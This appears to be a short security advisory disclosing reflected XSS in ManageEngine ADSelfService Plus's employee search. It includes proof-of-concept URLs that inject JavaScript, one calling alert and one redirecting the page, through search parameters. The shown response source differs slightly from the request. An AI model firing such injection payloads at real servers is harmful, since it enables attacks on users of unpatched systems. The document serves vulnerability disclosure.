Technical Details
=====================
Corporate Directory Search feature in ManageEngine ADSelfServicePlus
version 4.5 Build 4521 is susceptible to
non-persistent XSS attacks. These vulnerabilities are manifest by the
ability for attacker to terminate
javascript variable declarations, escape encapsulation, and append
arbitrary javascript code.
ADSelfService Plus is a password management application for Active
Directory environments.


Proof of Concept
===================
Double-Quote String Termination
HTTP Request =
https://serverip:port/EmployeeSearch.cc?searchType=contains&searchBy=ALL_FIELDS&searchString=";alert("XSS");//\"

Response Source View
<script language="javascript">
var searchValue = "';alert(XSS)//\"";

Single-Quote String Termination
Similarly...
HTTP Request=
https://serverip:port/EmployeeSearch.cc?searchType=';document.location="http://www.cnn.com";//\"&searchBy=ALL_FIELDS&searchString=Bob

Root Cause Analysis
